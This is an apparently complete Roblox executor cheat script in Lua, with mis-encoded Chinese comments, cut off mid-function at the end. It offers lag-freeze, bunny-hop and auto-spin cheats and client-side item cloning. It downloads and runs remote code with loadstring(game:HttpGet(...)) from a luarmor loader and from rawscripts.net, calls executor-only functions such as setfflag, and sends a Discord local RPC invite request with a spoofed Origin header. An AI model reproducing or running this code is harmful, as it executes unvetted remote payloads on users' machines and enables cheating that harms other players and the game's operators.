-- [[ ğŸ“¥ æ ¸å¿ƒè² è¼‰éƒ¨ç½²å€ (ç‰¹æ®Šç¬¦è™Ÿè£é£¾) ]] --
-- [[ â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•— ]] --
-- [[ â•‘  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•—     â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—   â•‘ ]] --
-- [[ â•‘  â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—  â•‘ ]] --
-- [[ â•‘  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘  â•‘ ]] --
-- [[ â•‘  â–ˆâ–ˆâ•”â•â•â•  â•šâ•â•â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•— â•šâ•â•â•â–ˆâ–ˆâ•‘  â•‘ ]] --
-- [[ â•‘  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•  â•‘ ]] --
-- [[ â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• ]] --

-- [[ âš™ï¸ æ ¸å¿ƒè®Šæ•¸èˆ‡åˆå§‹åŒ– ]]
_G.fKN = _G.fKN or "PageDown"           
_G.freezeMS = _G.freezeMS or 300      
_G.isMinimized = _G.isMinimized or false 
_G.toggleKey = _G.toggleKey or Enum.KeyCode.T
_G.bhop = false
_G.freeze = false

local p = game:GetService("Players").LocalPlayer
local UIS = game:GetService("UserInputService")
local VIM = game:GetService("VirtualInputManager")
local RS = game:GetService("RunService")
local VU = game:GetService("VirtualUser")
local Cam = workspace.CurrentCamera
local BG_IMAGE_ID = "rbxassetid://117164248667049"

-- [[ âŒ¨ï¸ AD (Spin) é‚è¼¯è®Šæ•¸ - å¿…é ˆæ”¾åœ¨ Input å‰å®šç¾© ]]
local activeAD = false
local switchInterval = 0.08 
local pressDuration = 0.000000001 
local sensitivity = 0.005 
local lastCameraAngle = select(2, Cam.CFrame:ToOrientation())

-- 1. å®šç¾©æ™ºèƒ½é‡ç½®å‡½æ•¸ (å·²ä¿®å¾©æ‰‹å‹•è¡çªå•é¡Œ)
local function forceReset()
    activeAD = false
    
    -- æª¢æŸ¥ï¼šåªæœ‰ç•¶ç©å®¶ã€Œæ‰‹å‹•æ²’æŒ‰è‘—ã€A æ™‚ï¼Œæ‰ç™¼é€æ”¾é–‹æŒ‡ä»¤
    if not UIS:IsKeyDown(Enum.KeyCode.A) then
        VIM:SendKeyEvent(false, Enum.KeyCode.A, false, game)
    end
    
    -- æª¢æŸ¥ï¼šåªæœ‰ç•¶ç©å®¶ã€Œæ‰‹å‹•æ²’æŒ‰è‘—ã€D æ™‚ï¼Œæ‰ç™¼é€æ”¾é–‹æŒ‡ä»¤
    if not UIS:IsKeyDown(Enum.KeyCode.D) then
        VIM:SendKeyEvent(false, Enum.KeyCode.D, false, game)
    end
    
    print("\\\\ SYSTEM \\\\ [[ SPIN_DEACTIVATED - MANUAL_PRESERVED ]]")
end

-- [[ ğŸš€ æ¨™é ­è¼¸å‡ºï¼šANSI 3D ç«‹é«”æ–œé«” ]]
local function showHeader()
    local wall = "///////////////////////////////////////////////////////////////////////////////////"
    local floor = "\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\"
    print("\n" .. wall)
    print([[										
  ________  ________  ________  ___       ________   _______
 |\   ____\|\   ____\|\   __  \|\  \     |\   __  \|\   __  \
 \ \  \___|\ \  \____| \  \|\  \ \  \    \ \  \|\  \ \  \|\  \
  \ \  \___\\ \_____  \ \   __  \ \  \    \ \  _____\ \_____  \
   \ \  \__|_\| _____\ \ \  \ \  \ \  \____\ \  \\_ \_|_____\  \
    \ \_______\ \_______\ \__\ \__\ \_______\ \__\ \ _\\\_______\
     \|_______|\|_______|\|__|\|__|\|_______|\|__|\|__|\|_______|
    ]])
    print(floor)
    print("|||| \\\\ //// @@@@ [ SYSTEM_OVERRIDE_INITIATED ] @@@@ //// \\\\ ||||")
    print("|||| OPERATOR : @E5alR9          |||| SECURITY : LEVEL_MAX     ||||")
    print("|||| STATUS   : OVERCLOCKED      |||| KERNEL   : STABLE        ||||")
    print(floor)
    print(wall .. "\n")
end
showHeader()

-- [[ ğŸ› ï¸ æ¨¡çµ„ä¸€ï¼šè³‡æºéƒ¨ç½² - é›™é‡è©¢å•ç‰ˆ ]]
task.spawn(function()
    print("//// #### [M1] DATA_DEPLOYMENT_START #### ////")
    _G.emoteSwaps = { { current = "APose", needed = "Broom" } }
    
    local function dl(u) 
        task.spawn(function() 
            print("\\\\\\\\ HTTP \\\\\\\\ <REQUESTING_REMOTE_PAYLOAD> ...")
            local s, e = pcall(function() loadstring(game:HttpGet(u))() end) 
            if s then print("|||| SUCCESS |||| %%% Payload_Injected_Successfully") 
            else print("|||| ERROR |||| !!! Failure: " .. tostring(e)) end
        end) 
    end
    dl("https://api.luarmor.net/files/v3/loaders/36d5417f898691cb6c6d347b077e01e2.lua")

    local S = game:GetService("ReplicatedStorage"):WaitForChild("Items")
    
    local function dup(folder, old, new) 
        local i = folder:FindFirstChild(old) 
        if i then 
            print("//// CLONE //// " .. old .. " ===>>> " .. new)
            i:Clone().Parent = folder i.Name = new 
        end 
    end

    -- [[ ğŸ”” è©¢å• 1: Rockin ]]
    local rockinBind = Instance.new("BindableFunction")
    rockinBind.OnInvoke = function(answer)
        if answer == "NO" then
            dup(S.Emotes, "RockinStride", "Stride")
        else
            print("|||| CHOICE: YES |||| Skipping RockinStride")
        end
    end

    -- [[ ğŸ”” è©¢å• 2: Broom ]]
    local broomBind = Instance.new("BindableFunction")
    broomBind.OnInvoke = function(answer)
        if answer == "NO" then
            dup(S.Emotes, "Broom", "SnowmobileCruise")
        else
            print("|||| CHOICE: YES |||| Skipping Broom")
        end
    end

    -- åŸ·è¡Œé€šçŸ¥
    pcall(function()
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "SYSTEM CHECK";
            Text = "do u have Rockin?";
            Duration = 99999;
            Button1 = "YES";
            Button2 = "NO";
            Callback = rockinBind;
        })
        
        task.wait(2) -- ç¨å¾®å»¶é²é¿å…é€šçŸ¥æ‰“æ¶
        
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "SYSTEM CHECK";
            Text = "do u have Broom?";
            Duration = 99999;
            Button1 = "YES";
            Button2 = "NO";
            Callback = broomBind;
        })
    end)

    -- ç„¡è«–å¦‚ä½•éƒ½åŸ·è¡Œçš„éƒ¨åˆ† (Cosmetics)
    pcall(function()
        dup(S.Cosmetics, "ToxicInferno", "BorealisAurora")
    end)

    -- é˜²æ›æ©Ÿç³»çµ± (ä¿æŒåŸæ¨£)
    p.Idled:Connect(function() 
        VU:CaptureController() 
        VU:ClickButton2(Vector2.zero) 
        print("//// PULSE //// Activity_Heartbeat_Sent")
    end)
end)

-- [[ âš™ï¸ æ¨¡çµ„äºŒï¼šå¼•æ“åŒæ­¥ ]]
task.spawn(function()
    task.wait(1.5) 
    print("\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\ [ ENGINE_SYNCHRONIZATION ] ////////////////////")
    if #game.Players:GetPlayers() == 1 then
        print("\\\\ CHECK \\\\ Solo_Mode_Active...")
        local E = game:GetService("ReplicatedStorage"):WaitForChild("Items"):WaitForChild("Emotes")
        local s, r, b = E:FindFirstChild("Stride"), E:FindFirstChild("RockinStride"), E:FindFirstChild("Broom")
        
        if s and r and b then
            print("\\\\ SYNC \\\\ Overwriting_Classic_Modules...")
            local bm, rm = b:FindFirstChild("EmoteModuleClassic"), r:FindFirstChild("EmoteModuleClassic")
            if bm and rm then
                local nm = bm:Clone()
                nm:ClearAllChildren()
                for _, o in ipairs(rm:GetChildren()) do o:Clone().Parent = nm end
                rm:Destroy()
                nm.Name, nm.Parent = "EmoteModuleClassic", r
            end
            s:ClearAllChildren()
            for _, i in ipairs(r:GetChildren()) do i:Clone().Parent = s end
            print("\\\\ DONE \\\\ Deep_Integrity_Check_Pass")
        end
    end
end)

-- [[ ğŸ–¥ï¸ ä»‹é¢è™•ç†æ ¸å¿ƒ - å®Œç¾æ•´åˆç‰ˆ ]]
local function createUI()
    if p.PlayerGui:FindFirstChild("E5_Console") then p.PlayerGui.E5_Console:Destroy() end
    local sg = Instance.new("ScreenGui", p.PlayerGui)
    sg.Name, sg.ResetOnSpawn, sg.DisplayOrder = "E5_Console", false, 999
    
    local m = Instance.new("Frame", sg)
    m.Size = _G.isMinimized and UDim2.new(0, 100, 0, 30) or UDim2.new(0, 400, 0, 430)
    m.Position = UDim2.new(0, 15, 0.4, 0)
    m.BackgroundColor3, m.BackgroundTransparency, m.BorderSizePixel = Color3.new(0,0,0), 1, 1
    m.Active, m.Draggable = true, true

    local bg = Instance.new("ImageLabel", m)
    bg.Size, bg.Image, bg.ScaleType = UDim2.new(1, 0, 1, 0), BG_IMAGE_ID, Enum.ScaleType.Stretch
    bg.BackgroundTransparency, bg.Visible = 1, not _G.isMinimized

    local bar = Instance.new("Frame", m)
    bar.Size, bar.BackgroundColor3, bar.ZIndex = UDim2.new(1, 0, 0, 30), Color3.new(0.05, 0.05, 0.05), 5
    
    local xBtn = Instance.new("TextButton", bar)
    xBtn.Size, xBtn.Position, xBtn.Text = UDim2.new(0, 30, 0, 30), UDim2.new(1, -30, 0, 0), "X"
    xBtn.TextColor3, xBtn.BackgroundTransparency, xBtn.ZIndex, xBtn.TextSize = Color3.new(1, 0.2, 0.2), 1, 6, 18
    xBtn.MouseButton1Click:Connect(function() sg.Enabled = false end)

    local minBtn = Instance.new("TextButton", bar)
    minBtn.Size, minBtn.Position, minBtn.Text = UDim2.new(0, 30, 0, 30), UDim2.new(1, -60, 0, 0), _G.isMinimized and "+" or "-"
    minBtn.TextColor3, minBtn.BackgroundTransparency, minBtn.ZIndex, minBtn.TextSize = Color3.new(1, 1, 1), 1, 6, 18

    local content = Instance.new("Frame", m)
    content.Size, content.Position = UDim2.new(1, 0, 0, 150), UDim2.new(0, 0, 1, -160)
    content.BackgroundTransparency, content.Visible = 1, not _G.isMinimized 

    --- [[ ç¬¬ä¸€æ’ï¼šLAG TOOL (60%) | SPIN KEY (28%) ---
    local lagToolBtn = Instance.new("TextButton", content)
    lagToolBtn.Size, lagToolBtn.Position, lagToolBtn.Text = UDim2.new(0.6, 0, 0, 40), UDim2.new(0.05, 0, 0, 0), "ACTIVATE LAG TOOL"
    lagToolBtn.BackgroundColor3, lagToolBtn.TextColor3, lagToolBtn.BackgroundTransparency = Color3.new(0.2,0,0), Color3.new(1,0.5,0.5), 0.7
    lagToolBtn.MouseButton1Click:Connect(function()
        -- é€™è£¡æ”¾ä½ åŸæœ¬çš„ SpecificLagSystem ç”Ÿæˆé‚è¼¯
        if p.PlayerGui:FindFirstChild("SpecificLagSystem") then p.PlayerGui.SpecificLagSystem:Destroy() end
        local freezeSystemGui = Instance.new("ScreenGui", p.PlayerGui)
        freezeSystemGui.Name, freezeSystemGui.DisplayOrder = "SpecificLagSystem", 1000

        local function applyDraggable(btn, onClick)
            local dragging, dragStart, startPos, pressStartTime = false, nil, nil, 0
            btn.InputBegan:Connect(function(input)
                if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                    dragging, dragStart, startPos, pressStartTime = true, input.Position, btn.Position, tick()
                end
            end)
            UIS.InputChanged:Connect(function(input)
                if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
                    if tick() - pressStartTime > 0.3 then
                        local delta = input.Position - dragStart
                        btn.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
                    end
                end
            end)
            UIS.InputEnded:Connect(function(input)
                if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                    dragging = false
                    if tick() - pressStartTime < 0.3 then onClick() end
                end
            end)
        end

        local lagBtn = Instance.new("TextButton", freezeSystemGui)
        lagBtn.Size, lagBtn.Position, lagBtn.Text = UDim2.new(0, 90, 0, 45), UDim2.new(0.96, 0, 0.45, 0), "LAG ONCE"
        lagBtn.BackgroundColor3, lagBtn.TextColor3 = Color3.fromRGB(60, 60, 60), Color3.new(1, 1, 1)
        lagBtn.AnchorPoint = Vector2.new(1, 0.5)
        Instance.new("UICorner", lagBtn)
        applyDraggable(lagBtn, function()
            game:GetService("StarterGui"):SetCore("SendNotification", { Title = "SYSTEM", Text = "Freeze: " .. (_G.freezeMS or 300) .. "ms", Duration = 0.5 })
            local freezeSec = (_G.freezeMS or 300) / 1000
            lagBtn.BackgroundColor3, lagBtn.Text = Color3.fromRGB(255, 0, 0), "FREEZING"
            local t = os.clock()
            while os.clock() - t < freezeSec do end 
            lagBtn.BackgroundColor3, lagBtn.Text = Color3.fromRGB(60, 60, 60), "LAG ONCE"
        end)
        
        local closeBtn = Instance.new("TextButton", freezeSystemGui)
        closeBtn.Size, closeBtn.Position, closeBtn.Text = UDim2.new(0, 70, 0, 35), UDim2.new(0.96, 0, 0.52, 0), "CLOSE"
        closeBtn.BackgroundColor3, closeBtn.TextColor3 = Color3.fromRGB(150, 0, 0), Color3.new(1, 1, 1)
        closeBtn.AnchorPoint = Vector2.new(1, 0.5)
        Instance.new("UICorner", closeBtn)
        applyDraggable(closeBtn, function() freezeSystemGui:Destroy() end)
    end)

    local spinBindBtn = Instance.new("TextButton", content)
    spinBindBtn.Size, spinBindBtn.Position = UDim2.new(0.28, 0, 0, 40), UDim2.new(0.67, 0, 0, 0)
    spinBindBtn.Text = "SPIN:" .. _G.toggleKey.Name
    spinBindBtn.BackgroundColor3, spinBindBtn.TextColor3, spinBindBtn.BackgroundTransparency = Color3.new(0.1, 0.1, 0.3), Color3.new(1, 1, 1), 0.7
    spinBindBtn.MouseButton1Click:Connect(function()
        spinBindBtn.Text = "..."
        local con; con = UIS.InputBegan:Connect(function(i) 
            if i.UserInputType == Enum.UserInputType.Keyboard then 
                _G.toggleKey = i.KeyCode; spinBindBtn.Text = "SPIN:" .. i.KeyCode.Name; con:Disconnect() 
                game:GetService("StarterGui"):SetCore("SendNotification", { Title = "SYSTEM", Text = "Spin Key Changed: " .. _G.toggleKey.Name, Duration = 2 })
            end 
        end)
    end)

    --- [[ ç¬¬äºŒæ’ï¼šKeybind | MS (å·²ä¿®å¾©é€šçŸ¥é‚è¼¯) ---
local l = Instance.new("TextButton", content)
l.Size, l.Position, l.Text = UDim2.new(0.42, 0, 0, 40), UDim2.new(0.05, 0, 0, 50), _G.fKN
l.BackgroundColor3, l.TextColor3, l.BackgroundTransparency = Color3.new(0,0,0), Color3.new(1,1,1), 0.7
l.MouseButton1Click:Connect(function()
    l.Text = "..."
    local con; con = UIS.InputBegan:Connect(function(i) 
        if i.UserInputType == Enum.UserInputType.Keyboard then 
            _G.fKN = i.KeyCode.Name; l.Text = _G.fKN; con:Disconnect() 
            game:GetService("StarterGui"):SetCore("SendNotification", { Title = "SYSTEM", Text = "Key Changed: " .. _G.fKN, Duration = 2 })
        end 
    end)
end)

local tb = Instance.new("TextBox", content)
tb.Size, tb.Position, tb.Text = UDim2.new(0.42, 0, 0, 40), UDim2.new(0.53, 0, 0, 50), tostring(_G.freezeMS)
tb.BackgroundColor3, tb.TextColor3, tb.BackgroundTransparency = Color3.new(0,0,0), Color3.new(1,1,0), 0.7
tb.FocusLost:Connect(function(enterPressed)
    local val = tonumber(tb.Text)
    if val then 
        _G.freezeMS = math.clamp(val, 0, 5000) 
        tb.Text = tostring(_G.freezeMS) 
        -- ä¿®æ­£é»ï¼šé‡æ–°åŠ å…¥æ¶ˆå¤±çš„ç³»çµ±é€šçŸ¥
        game:GetService("StarterGui"):SetCore("SendNotification", { 
            Title = "SYSTEM", 
            Text = "MS Adjusted: " .. tostring(_G.freezeMS) .. "ms", 
            Duration = 2 
        })
    else
        tb.Text = tostring(_G.freezeMS) -- å¦‚æœè¼¸å…¥ä¸æ˜¯æ•¸å­—ï¼Œé‡ç½®å›åŸæœ¬æ•¸å€¼
    end
end)

    --- [[ ç¬¬ä¸‰æ’ï¼šFPS | STEPS ---
    local fBtn = Instance.new("TextButton", content)
    fBtn.Size, fBtn.Position, fBtn.Text = UDim2.new(0.42, 0, 0, 40), UDim2.new(0.05, 0, 0, 100), "DisplayFPS(RE)"
    fBtn.BackgroundColor3, fBtn.TextColor3, fBtn.BackgroundTransparency = Color3.new(0,0,0), Color3.new(0,1,1), 0.7
    fBtn.MouseButton1Click:Connect(function()
        pcall(function() setfflag("DebugDisplayFPS", "true") end)
        game:GetService("TeleportService"):Teleport(game.PlaceId, p)
    end)

    local sBtn = Instance.new("TextButton", content)
    sBtn.Size, sBtn.Position, sBtn.Text = UDim2.new(0.42, 0, 0, 40), UDim2.new(0.53, 0, 0, 100), "MissedSteps(RE)"
    sBtn.BackgroundColor3, sBtn.TextColor3, sBtn.BackgroundTransparency = Color3.new(0,0,0), Color3.new(0,1,0), 0.7
    sBtn.MouseButton1Click:Connect(function()
        pcall(function() setfflag("MaxMissedWorldStepsRemembered", "2147483467") end)
        game:GetService("TeleportService"):Teleport(game.PlaceId, p)
    end)

    minBtn.MouseButton1Click:Connect(function()
        _G.isMinimized = not _G.isMinimized
        m.Size = _G.isMinimized and UDim2.new(0, 100, 0, 30) or UDim2.new(0, 400, 0, 430)
        bg.Visible, content.Visible = not _G.isMinimized, not _G.isMinimized
        minBtn.Text = _G.isMinimized and "+" or "-"
    end)
end

createUI()

-- [[ ğŸ”„ è§’è‰²è™•ç†ï¼šå…¨åŸŸåŒæ­¥ç‰ˆæœ¬ ]]
local function run(c)
    local charPlayer = game.Players:GetPlayerFromCharacter(c)
    local lp = game.Players.LocalPlayer
    if not charPlayer then return end

    -- ==========================================
    -- 1. é‡å°æœ¬åœ°ç©å®¶ (ä½ è‡ªå·±) çš„ Korblox æª¢æ¸¬
    -- ==========================================
    if charPlayer == lp then
        -- UI é‡å•Ÿ
        local console = lp.PlayerGui:FindFirstChild("E5_Console")
        if console then console.Enabled = true else createUI() end

        task.spawn(function()
            local KORBLOX_BUNDLE_ID = 1924515
            local isReal = false

            -- [æ–¹æ³• A] å¾ Roblox å®˜ç¶²è®€å–ä½ ã€Œç¾åœ¨ç©¿ä»€éº¼ã€ (ä¸å—è…³æœ¬å»¶é²å½±éŸ¿)
            local success, appearance = pcall(function()
                return game.Players:GetCharacterAppearanceInfoAsync(lp.UserId)
            end)

            if success and appearance and appearance.assets then
                for _, asset in ipairs(appearance.assets) do
                    -- æª¢æŸ¥æ˜¯å¦æœ‰ Korblox ç›¸é—œçš„ Asset ID
                    if asset.id == 134082440 or asset.id == 1924515 or tostring(asset.name):find("Korblox") then
                        isReal = true
                        break
                    end
                end
            end

            -- [æ–¹æ³• B] é›™é‡æª¢æŸ¥ï¼šå¦‚æœæ–¹æ³• A å¤±æ•—ï¼Œç›´æ¥æƒæè§’è‰²æ¨¡å‹ä¸­çš„ CharacterMesh
            if not isReal then
                for _, obj in ipairs(c:GetDescendants()) do
                    if obj:IsA("CharacterMesh") and (obj.MeshId == 902942093 or obj.MeshId == 902942096) then
                        isReal = true
                        break
                    end
                end
            end

            -- [æœ€çµ‚çµæœåˆ¤æ–·]
            if not isReal then
                print("//// [CHECK]  loading fake Korblox ////")
                pcall(function()
                    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Korblox-All-61127"))()
                end)
            else
                print("//// [CHECK] real Korblox ////")
            end
        end)
    end

    -- ==========================================
    -- 2. æ‰€æœ‰äººç„¡é ­è™•ç† (ä¿æŒä¸è®Š)
    -- ==========================================
    task.spawn(function()
        local h = c:WaitForChild("Head", 10)
        if h then 
            task.wait(0.1)
            h.Transparency = 1 
            for _, v in pairs(h:GetChildren()) do 
                if v:IsA("Decal") then v.Transparency = 1 end 
            end 
        end
    end)
end

-- [[ ğŸš€ å•Ÿå‹•èˆ‡æŒçºŒç›£æ§ ]]
task.spawn(function()
    print("//// #### [M3] GLOBAL_SYSTEM_BOOTUP #### ////")
    createUI() 
    
    local function monitor(plr)
        -- è™•ç†ç•¶å‰è§’è‰²
        if plr.Character then task.spawn(run, plr.Character) end
        -- è™•ç†æ­»äº¡å¾©æ´»
        plr.CharacterAdded:Connect(function(char)
            run(char)
        end)
    end

    -- æƒæå…¨æœç©å®¶
    for _, plr in ipairs(game.Players:GetPlayers()) do
        monitor(plr)
    end
    
    -- ç›£è½æ–°é€²ç©å®¶
    game.Players.PlayerAdded:Connect(monitor)
end)

-- [[ âŒ¨ï¸ è¼¸å…¥åµæ¸¬æ ¸å¿ƒï¼šå•Ÿå‹•èˆ‡åœæ­¢ (æ™ºèƒ½é‡ç½®ç‰ˆ) ]]

-- 1. åµæ¸¬æŒ‰ä¸‹
UIS.InputBegan:Connect(function(i, processed)
    if processed then return end 
    
    if i.KeyCode == Enum.KeyCode.Space then 
        _G.bhop = true 
    elseif i.KeyCode.Name == _G.fKN then 
        _G.freeze = true 
    elseif i.KeyCode == _G.toggleKey then 
        activeAD = true
        print("\\\\ SYSTEM \\\\ [[ SPIN_ACTIVATED ]]")
    end 
end)

-- 2. åµæ¸¬æ”¾é–‹ (åŒ…å«æ™ºèƒ½é‡ç½®æª¢æŸ¥)
UIS.InputEnded:Connect(function(i) 
    if i.KeyCode == Enum.KeyCode.Space then 
        _G.bhop = false 
    elseif i.KeyCode.Name == _G.fKN then 
        _G.freeze = false 
    elseif i.KeyCode == _G.toggleKey then 
        -- å‘¼å«æ™ºèƒ½é‡ç½®ï¼Œæœƒåˆ¤æ–·ä½ æ˜¯å¦æŒ‰è‘— AD
        forceReset()
    end 
end)

-- 3. å¼·åˆ¶ä¿éšªçµ² (æ¯ 0.5 ç§’åŒæ­¥ç‹€æ…‹)
task.spawn(function()
    while true do
        -- å¦‚æœé–‹é—œè®Šæ•¸æ˜¯é–‹å•Ÿçš„ï¼Œä½†å¯¦é«”æŒ‰éµæ²’è¢«æŒ‰ä¸‹ï¼ŒåŸ·è¡Œæ™ºèƒ½é‡ç½®
        if activeAD and not UIS:IsKeyDown(_G.toggleKey) then
            forceReset()
        end
        task.wait(0.5)
    end
end)

-- 2. ç‰©ç†å¾ªç’°ï¼šè™•ç† Bhop èˆ‡ Freeze
RS.Heartbeat:Connect(function()
    local c = p.Character
    local r = c and c:FindFirstChild("HumanoidRootPart")
    local hum = c and c:FindFirstChildOfClass("Humanoid")

    -- [[ Bhop é‚è¼¯ ]]
    if _G.bhop and hum and hum.FloorMaterial ~= Enum.Material.Air then 
        hum:ChangeState(3) 
    end

    -- [[ Freeze æ ¸å¿ƒ (å°„ç·šè§¸ç™¼ç‰ˆ) ]]
    if _G.freeze and r then
        local lp = RaycastParams.new()
        lp.FilterDescendantsInstances = {c}
        
        -- åˆ¤å®šï¼šè…³ä¸‹ 20 å–®ä½æˆ–å‰æ–¹ 15 å–®ä½æœ‰ç‰©é«”æ™‚è§¸ç™¼
        if workspace:Raycast(r.Position, Vector3.new(0,-20,0), lp) or workspace:Raycast(r.Position, r.CFrame.LookVector*15, lp) then
            
            -- è·³å‡º UI é€šçŸ¥
            game:GetService("StarterGui"):SetCore("SendNotification", { 
                Title = "SYSTEM"; 
                Text = "Freeze: " .. tostring(_G.freezeMS) .. "ms"; 
                Duration = 0.5; 
            })
            
            -- åŸ·è¡Œç‰©ç†é˜»æ–· (ä¾æ“š UI è¨­å®šçš„ ms)
            local t = os.clock() 
            local delayTime = (tonumber(_G.freezeMS) or 300) / 1000
            while os.clock() - t < delayTime do end 
        end
    end
end)

-- [[ âŒ¨ï¸ æ ¸å¿ƒ AD æ—‹è½‰é‚è¼¯å¾ªç’° - æ‰‹å‹•é¿è®“å¢å¼·ç‰ˆ ]]
task.spawn(function()
    while true do
        -- ç²å–ç©å®¶æ˜¯å¦æ­£åœ¨æ‰‹å‹•æŒ‰ä¸‹ A æˆ– D
        local manualA = UIS:IsKeyDown(Enum.KeyCode.A)
        local manualD = UIS:IsKeyDown(Enum.KeyCode.D)
        local isMovingManually = manualA or manualD

        if activeAD and not isMovingManually then
            local success, err = pcall(function()
                -- 1. ç²å–ç•¶å‰è¦–è§’è§’åº¦è®ŠåŒ– (Yè»¸)
                local _, currentY, _ = Cam.CFrame:ToOrientation()
                local deltaY = currentY - lastCameraAngle
                
                -- ä¿®æ­£å¼§åº¦è·¨è¶Š 180/-180 åº¦çš„è·³è½‰å•é¡Œ
                if deltaY > math.pi then 
                    deltaY = deltaY - (math.pi * 2)
                elseif deltaY < -math.pi then 
                    deltaY = deltaY + (math.pi * 2) 
                end

                -- 2. è§¸ç™¼åˆ¤å®šï¼šè½‰å‹•å¹…åº¦é–€æª»
                if math.abs(deltaY) > sensitivity then
                    local firstKey, secondKey
                    
                    if deltaY < 0 then 
                        -- ç•«é¢å³è½‰ -> å…ˆ D å¾Œ A
                        firstKey, secondKey = Enum.KeyCode.D, Enum.KeyCode.A
                    else 
                        -- ç•«é¢å·¦è½‰ -> å…ˆ A å¾Œ D
                        firstKey, secondKey = Enum.KeyCode.A, Enum.KeyCode.D
                    end
                    
                    lastCameraAngle = currentY 

                    -- åŸ·è¡Œç¬¬ä¸€éšæ®µ (å¢åŠ æ‰‹å‹•æª¢æŸ¥)
                    if not UIS:IsKeyDown(firstKey) then
                        VIM:SendKeyEvent(true, firstKey, false, game)
                        task.wait(pressDuration)
                        VIM:SendKeyEvent(false, firstKey, false, game)
                    end

                    task.wait(switchInterval)
                    
                    -- äºŒæ¬¡æª¢æŸ¥ï¼šé˜²æ­¢ç­‰å¾…æœŸé–“é¬†é–‹é–‹é—œæˆ–é–‹å§‹æ‰‹å‹•ç§»å‹•
                    if not activeAD or UIS:IsKeyDown(Enum.KeyCode.A) or UIS:IsKeyDown(Enum.KeyCode.D) then 
                        return 
                    end

                    -- åŸ·è¡Œç¬¬äºŒéšæ®µ
                    if not UIS:IsKeyDown(secondKey) then
                        VIM:SendKeyEvent(true, secondKey, false, game)
                        task.wait(pressDuration)
                        VIM:SendKeyEvent(false, secondKey, false, game)
                    end
                    
                    task.wait(switchInterval)
                else
                    lastCameraAngle = currentY
                    task.wait(0.01) 
                end
            end)
            if not success then task.wait(0.1) end
        else
            -- å¦‚æœæ­£åœ¨æ‰‹å‹•ç§»å‹•ï¼Œè…³æœ¬æ”¾é–‹æ‰€æœ‰æ¨¡æ“¬æŒ‰éµä¸¦åŒæ­¥è§’åº¦
            if isMovingManually then
                -- é€™è£¡ä¸ä½¿ç”¨ forceReset ä»¥å…é€£ä½ æ‰‹å‹•æŒ‰çš„éƒ½è¢«æ”¾é–‹
                -- åƒ…æ›´æ–°è§’åº¦ç´€éŒ„ï¼Œç¢ºä¿æ‰‹å‹•åœæ­¢å¾Œæ—‹è½‰èƒ½å¹³æ»‘æ¥ä¸Š
                lastCameraAngle = select(2, Cam.CFrame:ToOrientation())
            else
                lastCameraAngle = select(2, Cam.CFrame:ToOrientation())
            end
            task.wait(0.05)
        end
    end
end)

-- [[ ğŸ“¡ Module 4: Social Daemon ]]
task.spawn(function()
    print("//// [M4] STARTING SOCIAL_DAEMON ////////")
    local bindable = Instance.new("BindableFunction")
    bindable.OnInvoke = function(answer)
        if answer == "YES" then
            print("|||| [SOCIAL] ACCEPTED ////////")
            local req = (syn and syn.request) or (http and http.request) or http_request or request
            if req then pcall(function() req({Url = "http://127.0.0.1:6463/rpc?v=1", Method = "POST", Headers = {["Content-Type"] = "application/json", ["Origin"] = "https://discord.com"}, Body = game:GetService("HttpService"):JSONEncode({cmd = "INVITE_BROWSER", args = {code = DC_CODE}, nonce = game:GetService("HttpService"):GenerateGUID(false)})}) end) end
            if setclipboard then setclipboard(DC_URL) end
        elseif answer == "NO" then
            print("|||| [SOCIAL] DECLINED :-( ////////")
